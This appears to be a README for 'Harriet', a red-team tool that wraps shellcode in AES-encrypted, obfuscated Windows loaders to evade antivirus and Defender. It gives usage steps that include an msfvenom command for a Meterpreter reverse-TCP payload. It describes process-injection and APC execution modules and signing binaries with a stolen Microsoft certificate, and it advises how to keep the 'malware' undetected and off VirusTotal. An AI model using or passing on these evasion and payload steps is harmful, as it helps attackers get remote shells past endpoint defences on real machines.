**Meet Harriet!**

Harriet was inspired by the Charlotte C++ shellcode loader. This tool uses AES encryption and function/variable obfuscation to get around AV and Windows Defender. Most of the code was taken from the Sektor 7 Malware Development Essentials course. All credit goes to reenz0h and @Sektor7net. I wrote this mainly as a way to get a quick undetected executable for testing and to not have to switch over to a Windows VM every five seconds for compiling.

The payload framework is very effective when paired with my Covenant Randomizer script.

I was able to bypass Defender with Covenant with no problems.

I was also able to bypass Defender with a Meterpreter payload. This might not be as effective since Meterpreter is signatured so heavily. Your results will vary without modifying your Meterpreter payload's template inside Metasploit. Going with lesser used payloads will probably yield good results. 

**Modules**

There are four modules currently. As of this post, all of them bypass AV/Defender. 
 
AES Encrypted payload

AES Encrypted payload with process injection

QueueUserAPC shellcode execution

ThreadPoolWait shellcode execution. 

All of the modules use XOR encryption for strings and function obfuscation and AES encryption for payload exection. Once the payload is compiled, the script uses SigThief to sign the binary with a Microsoft certificate. 

**Usage:** 

Clone The Repo

**git clone https://github.com/assume-breach/Home-Grown-Red-Team.git**

Run The Setup Script

**cd Home-Grown-Red-Team/Harriet/
bash setup.sh**

Create Your Payload

**msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP lport=PORT -f raw > msfr.bin**

Run the Script

**bash Harriet.sh **

Fill In The Values As Prompted

**Mitigations**

There are a few issues that you should be aware of. The first is that this will be detected at some point. Eventually, it will wind up on VT or the AV engines will signature it. There are mitigations that you can take to customize it. The first is to change the Virt_Alloc variable in all of the scripts. The second is to change all of the values in the perl scripts. Adding various sleep functions within the scripts can also keep the script from being signatured. The binary that Harriet uses to sign your malware is a Microsoft Office 365 updater. You can switch this out with a different binary and replace the path for your new exe in the scripts. This can help with keeping your malware undetected. 

**Enjoy and DON'T UPLOAD TO Virus Total!!!!!**
